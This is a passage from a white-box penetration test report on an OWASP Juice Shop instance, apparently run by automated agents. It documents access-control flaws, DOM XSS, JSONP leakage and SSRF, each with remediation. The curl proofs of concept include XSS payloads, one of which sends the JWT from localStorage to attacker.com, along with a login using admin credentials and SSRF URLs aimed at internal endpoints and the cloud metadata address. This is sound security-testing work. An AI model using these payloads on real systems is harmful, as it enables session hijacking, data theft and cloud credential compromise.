### AUTHZ-004: Regular User Accesses Full User List

**Severity:** High
**Type:** Broken Access Control / Excessive Data Exposure
**Endpoint:** `GET /api/Users`
**Verdict:** EXPLOITED

**Description:** The user listing endpoint correctly rejects unauthenticated requests (HTTP 401) but returns the full user list to any authenticated user regardless of role. Customers can enumerate all registered accounts, emails, roles, and profile metadata.

**Proof of Concept:**
```bash
curl -s http://localhost:3001/api/Users \
  -H "Authorization: Bearer <USER_TOKEN_CUSTOMER_ROLE>"
```

Response (HTTP 200): 22 users returned with id, email, role, profileImage, and account timestamps for all users including admins.

**Impact:** Full user enumeration enables targeted phishing, credential stuffing, and social engineering attacks against all registered users.

**Remediation:** Restrict `GET /api/Users` to admin role only. For customer-facing use cases where a user needs their own profile, use `/rest/user/whoami` instead.

---

### AUTHZ-005: IDOR on User Profile Endpoint

**Severity:** High
**Type:** Insecure Direct Object Reference
**Endpoint:** `GET /api/Users/:id`
**Verdict:** EXPLOITED

**Description:** Any authenticated user can retrieve the full profile of any other user by ID, including their role, last login IP, and profile image URL.

**Proof of Concept:**
```bash
curl -s http://localhost:3001/api/Users/1 \
  -H "Authorization: Bearer <USER_TOKEN_CUSTOMER_ROLE>"
```

Response (HTTP 200): Full admin profile returned including `role: "admin"`, `lastLoginIp`, `profileImage`, `isActive`, and account timestamps.

**Impact:** Full user profile enumeration. Attackers can identify admin accounts, map user IDs to emails, and gather reconnaissance data for targeted attacks.

**Remediation:** Restrict `GET /api/Users/:id` to admin role, or limit non-admin users to retrieving only their own profile (verify `req.params.id === req.user.data.id`).

---

### AUTHZ-006: Forged Product Review with Arbitrary Author

**Severity:** High
**Type:** Broken Access Control / Missing Authentication
**Endpoint:** `PUT /rest/products/:id/reviews`
**Verdict:** EXPLOITED

**Description:** The review submission endpoint requires no authentication and accepts an arbitrary `author` field in the request body. Any anonymous request can post a review attributed to any email address, including `admin@juice-sh.op`.

**Proof of Concept:**
```bash
curl -s -X PUT http://localhost:3001/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -d '{"message":"GUARDIAN_PENTEST: Forged review","author":"admin@juice-sh.op"}'
```

Response (HTTP 201): Review created. Verified appearing in product listing as authored by `admin@juice-sh.op`.

**Impact:** Reputation manipulation, disinformation, and astroturfing. Attackers can impersonate any user or admin in product reviews. Forged admin endorsements could manipulate purchasing decisions.

**Remediation:** Require authentication on the review endpoint. Extract the author from the authenticated user's JWT claims server-side — never accept author identity from the client.

---

### AUTHZ-008: Admin Endpoints Accessible Without Authentication

**Severity:** High
**Type:** Broken Access Control / Information Disclosure
**Endpoint:** `GET /rest/admin/application-configuration`, `GET /rest/admin/application-version`
**Verdict:** EXPLOITED

**Description:** Administrative endpoints exposing full server configuration and version information are publicly accessible without any authentication.

**Proof of Concept:**
```bash
curl -s http://localhost:3001/rest/admin/application-configuration
```

Response (HTTP 200): Full server config including internal port, base URL, OAuth client IDs with authorized redirect URIs, chatbot training data paths, all 45 product configurations with pricing, deleted product dates, and user memory filenames.

```bash
curl -s http://localhost:3001/rest/admin/application-version
```

Response: `{"version":"19.2.1"}`

**Impact:** Full reconnaissance without authentication. OAuth client IDs enable phishing via redirect URI abuse. Exact version number enables targeted CVE exploitation. Deleted product dates and internal paths provide business intelligence.

**Remediation:** Require admin role authentication on all `/rest/admin/*` endpoints. Consider removing sensitive configuration data from client-accessible endpoints entirely.

---

### AUTHZ-007: Feedback Submission with Forged UserId

**Severity:** Medium
**Type:** Broken Access Control
**Endpoint:** `POST /api/Feedbacks`
**Verdict:** EXPLOITED

**Description:** The feedback endpoint accepts a `UserId` field from the request body and uses it directly to attribute the feedback, rather than extracting it from the authenticated user's JWT.

**Proof of Concept:**
```bash
# First, get CAPTCHA
curl -s http://localhost:3001/rest/captcha
# Response: {"captchaId":0,"captcha":"10+3-9","answer":"4"}

# Submit feedback as admin (id=1) but attribute to user 2
curl -s http://localhost:3001/api/Feedbacks/ \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"UserId":2,"captchaId":0,"captcha":"4","comment":"GUARDIAN_PENTEST: Forged feedback as different user","rating":1}'
```

Response confirms `"UserId": 2` — feedback attributed to a different user than the authenticated session.

**Impact:** Authenticated users can submit feedback, complaints, or negative reviews attributed to other users' accounts.

**Remediation:** Extract `UserId` from `req.user.data.id` (JWT claims) server-side. Ignore any `UserId` provided in the request body.

---

### AUTHZ-009: Unauthenticated Feedback Listing

**Severity:** Medium
**Type:** Information Disclosure / Missing Access Control
**Endpoint:** `GET /api/Feedbacks`
**Verdict:** EXPLOITED

**Description:** All feedback entries are accessible without authentication, including `UserId` mappings and partially masked email addresses.

**Proof of Concept:**
```bash
curl -s http://localhost:3001/api/Feedbacks
```

Response (HTTP 200): 9 feedback entries returned with `UserId`, comment text, rating, and partially masked email addresses.

**Impact:** User ID enumeration and PII leakage. Email patterns visible even with masking (e.g., `***der@juice-sh.op` maps to `bender@juice-sh.op`).

**Remediation:** Require authentication to view feedback. Strip `UserId` from public responses. Remove email addresses entirely from API responses.

---

### XSS-002: DOM-based XSS via Search Query Parameter

**Severity:** High
**Type:** DOM-based Cross-Site Scripting
**Endpoint:** `/#/search?q=`
**Source:** `frontend/src/app/search-result/search-result.component.ts:170`
**Verdict:** EXPLOITED

**Description:** The search results component calls `this.sanitizer.bypassSecurityTrustHtml(queryParam)` and renders the result via `[innerHTML]`. This explicitly disables Angular's built-in XSS protection for the search query parameter. Any HTML or JavaScript in the `q` parameter is rendered in the victim's browser.

**Proof of Concept:**

iframe javascript: URI (canonical payload):
```
http://localhost:3001/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E
```
Decoded: `<iframe src="javascript:alert(`xss`)">`
Result: Alert dialog displayed. Challenge `localXssChallenge` marked SOLVED.

Cookie theft via img onerror:
```
http://localhost:3001/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
```
Decoded: `<img src=x onerror=alert(document.cookie)>`
Result: Alert showing `language=en; continueCode=N1ZLVxd1ZHXtyIqTwFkSLtQcDDhJ8c4JTnjFZ3uw5tWKUXeH2bTkWGMDznQe`

Bonus iframe embed:
```
http://localhost:3001/#/search?q=%3Ciframe%20width%3D%22100%25%22%20height%3D%22166%22%20scrolling%3D%22no%22%20frameborder%3D%22no%22%20allow%3D%22autoplay%22%20src%3D%22https%3A//w.soundcloud.com/player/%3Furl%3Dhttps%253A//api.soundcloud.com/tracks/771984076%26color%3D%2523ff5500%26auto_play%3Dtrue%26hide_related%3Dfalse%26show_comments%3Dtrue%26show_user%3Dtrue%26show_reposts%3Dfalse%26show_teaser%3Dtrue%22%3E%3C/iframe%3E
```
Result: SoundCloud player iframe rendered. Challenge `xssBonusChallenge` marked SOLVED.

Weaponized JWT exfiltration URL:
```
http://localhost:3001/#/search?q=<img src=x onerror="new Image().src='https://attacker.com/steal?token='+localStorage.getItem('token')">
```

**Impact:** Arbitrary JavaScript execution in any victim's browser who follows the crafted URL. Enables session hijacking (JWT from localStorage, cookies), keylogging, phishing, and CSRF against all authenticated endpoints. The cookie theft PoC above confirmed live cookie access.

**Remediation:** Remove the `bypassSecurityTrustHtml()` call in `search-result.component.ts:170`. Use Angular's default sanitization (bind to a plain string, not `innerHTML`). Never use `bypassSecurityTrustHtml` unless the content is fully server-controlled and known-safe.

---

### XSS-007: JSONP Callback Information Disclosure

**Severity:** Medium
**Type:** JSONP / Cross-Origin Data Exfiltration
**Endpoint:** `GET /rest/user/whoami?callback=`
**Source:** `/tmp/juice-shop-src/routes/currentUser.ts:57-58`
**Verdict:** EXPLOITED

**Description:** The `/rest/user/whoami` endpoint supports JSONP via the `callback` query parameter (Express `res.jsonp()`). The response has `Access-Control-Allow-Origin: *`. When an authenticated user visits a malicious page, the attacker-controlled page can include a `<script>` tag pointing to this endpoint, receiving the victim's user data as a JavaScript callback.

**Proof of Concept:**

Unauthenticated:
```bash
curl -s 'http://localhost:3001/rest/user/whoami?callback=testfunc'
```
Response: `/**/ typeof testfunc === 'function' && testfunc({"user":{}});`

Authenticated as admin:
```bash
# Step 1: Login to get token
TOKEN=$(curl -s -X POST 'http://localhost:3001/rest/user/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# Step 2: Call JSONP endpoint with cookie
curl -s "http://localhost:3001/rest/user/whoami?callback=stealData" \
  -H "Cookie: token=$TOKEN"
```
Response: `/**/ typeof stealData === 'function' && stealData({"user":{"id":1,"email":"admin@juice-sh.op","lastLoginIp":"","profileImage":"/assets/public/images/uploads/1.jpg"}});`

**Impact:** Cross-origin exfiltration of authenticated user identity (id, email, lastLoginIp, profileImage) to any attacker-controlled page. Enables email address harvest and user enumeration.

**Remediation:** Remove JSONP support — use CORS with a restrictive origin allowlist instead. The `Access-Control-Allow-Origin: *` combined with cookie-based auth is particularly dangerous; restrict CORS to known frontend origins. If JSONP must be supported, validate the `callback` parameter against a strict alphanumeric pattern and require `SameSite=Strict` cookies.

---

### SSRF-001: Unrestricted Server-Side URL Fetch via Profile Image Upload

**Severity:** High
**Type:** Server-Side Request Forgery
**Endpoint:** `POST /profile/image/url`
**Source:** `/tmp/juice-shop-src/routes/profileImageUrlUpload.ts:24`
**Verdict:** EXPLOITED

**Description:** The profile image URL upload endpoint fetches a user-supplied URL server-side using `fetch(url)` with no validation, IP blocklisting, protocol restriction, or response type verification. The response body is written to disk and served back to the attacker as the profile image, providing a full exfiltration channel for any internal HTTP response.

**Proof of Concept (all via `POST /profile/image/url` with `Content-Type: application/x-www-form-urlencoded` and cookie auth):**

Internal application version endpoint:
```
imageUrl=http://localhost:3000/rest/admin/application-version
```
Result: `{"version":"19.2.1"}` stored and retrievable at `/assets/public/images/uploads/1.jpg`

Internal application configuration:
```
imageUrl=http://localhost:3000/rest/admin/application-configuration
```
Result: Full server configuration exfiltrated.

Internal Prometheus metrics:
```
imageUrl=http://localhost:3000/metrics
```
Result: CPU usage, startup timing, file upload counters — full operational metrics exfiltrated.

JWT RSA public key:
```
imageUrl=http://localhost:3000/encryptionkeys/jwt.pub
```
Result: RSA public key exfiltrated (useful for confirming JWT forgery attack).

Internal FTP directory listing:
```
imageUrl=http://localhost:3000/ftp
```
Result: Full directory listing of sensitive internal FTP files.

All IP bypass variants succeed (no blocklisting):

| Variant | URL | Result |
|---------|-----|--------|
| localhost | `http://localhost:3000/rest/admin/application-version` | SUCCESS |
| 127.0.0.1 | `http://127.0.0.1:3000/rest/admin/application-version` | SUCCESS |
| 0.0.0.0 | `http://0.0.0.0:3000/rest/admin/application-version` | SUCCESS |
| IPv6 ::1 | `http://[::1]:3000/rest/admin/application-version` | SUCCESS |

AWS metadata endpoint (no blocking, timed out due to non-AWS environment):
```
imageUrl=http://169.254.169.254/latest/meta-data/
```
URL stored in database confirming zero blocklist enforcement.

**Impact:** In the current environment: internal service enumeration and full response body exfiltration. In a cloud deployment: IAM credential theft via AWS/GCP/Azure instance metadata endpoint (`169.254.169.254`), enabling complete cloud account compromise. CVSS 3.1 Base Score: 7.7 (High).

**Remediation:**
1. Implement a URL allowlist — restrict `imageUrl` to known, trusted image hosting domains only.
2. Block all requests to private IP ranges: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`.
3. Restrict protocol to `https://` only.
4. Resolve the hostname before connecting and verify the resolved IP against the blocklist (DNS rebinding protection).
5. Validate response `Content-Type` is an image format before saving.
6. Cap response body size (e.g., 5MB) to prevent DoS.

---

## Mitigated Risks

The following vulnerabilities were tested but blocked by active security controls in the current Docker deployment (`safetyMode: auto`, challenge-gated secure code paths). These vulnerabilities exist in the codebase and would be exploitable in a non-Docker or challenge-enabled deployment.

| ID | Type | Endpoint | Blocking Control |
|----|------|----------|-----------------|
| XSS-001 | Reflected XSS via Track Order | `GET /rest/track-order/:id` | Regex stripping `/[^\w-]+/g` active (Docker mode) |
| XSS-003 | Stored XSS via Product Description | `PUT /api/Products/:id` | `sanitizeSecure` (recursive sanitize-html) active |
| XSS-004 | Stored XSS via True-Client-Ip Header | `GET /rest/saveLoginIp` | `sanitizeSecure` active |
| XSS-005 | Stored XSS via User Email | `POST /api/Users` | `sanitizeSecure` active |
| XSS-006 | Stored XSS via Feedback Comment | `POST /api/Feedbacks` | `sanitizeSecure` active |
| XSS-008 | Stored XSS via Username | `POST /profile` | `sanitizeSecure` active |

Note: The underlying vulnerable code paths (`bypassSecurityTrustHtml`, `sanitizeLegacy`) remain in the codebase. The mitigations are conditional on challenge flags — they are not architectural fixes.

---

## Methodology

This assessment was conducted as a full white-box penetration test combining static source code analysis with live exploitation against the running target at `http://localhost:3001`.

**Phase 1 — Reconnaissance:** Static analysis of the full source tree at `/tmp/juice-shop-src/` to identify technology stack, injection sinks, authentication mechanisms, and authorization controls. Concurrent live endpoint probing to confirm reachability and map the unauthenticated attack surface (65+ endpoints catalogued).

**Phase 2 — Exploitation:** Five parallel exploitation agents tested distinct vulnerability domains: SQL/NoSQL/Code Injection, XSS, Authentication, Authorization, and SSRF. Each agent produced evidence files with verbatim curl commands and live server responses. Exploitation was performed in sequence: injection first to obtain credentials, then auth bypass to obtain tokens, then authorization testing with those tokens, then XSS and SSRF with authenticated sessions.

**Phase 3 — Verification:** Each finding was verified with a working proof-of-concept producing a live server response, or confirmed via source code analysis with an annotated exploitation path. No findings are included without a confirmed PoC or direct code proof.

**Tools used:** curl, Python 3 (PyJWT for JWT forgery), Playwright (XSS browser automation), static source analysis.

---

## Scope and Limitations

**In scope:** All endpoints exposed on `http://localhost:3001`, full source code at `/tmp/juice-shop-src/`, all authentication and authorization paths, all injection surfaces.

**Constraints:**
- Docker safety mode (`safetyMode: auto`) deactivated 6 XSS challenges by switching to secure code paths. Those vectors are documented in the Mitigated Risks section.
- The `noSqlCommandChallenge` flag state affects the `GET /rest/products/:id/reviews` injection path (INJ-004); this finding was excluded from the summary table as its exploitability is conditional.
- `file://` protocol SSRF was not exploitable (Node.js native `fetch()` does not support `file://`).
- AWS IMDSv1 SSRF (169.254.169.254) was not reachable in the local Docker environment but confirmed as unblocked.
- Business logic vulnerabilities (negative order totals, free deluxe membership, forged coupons, basket manipulation, zip slip, XXE, open redirect) were identified in recon and source analysis but were not fully exploited in the live target during this assessment window. These represent additional risk beyond the 29 findings documented here.
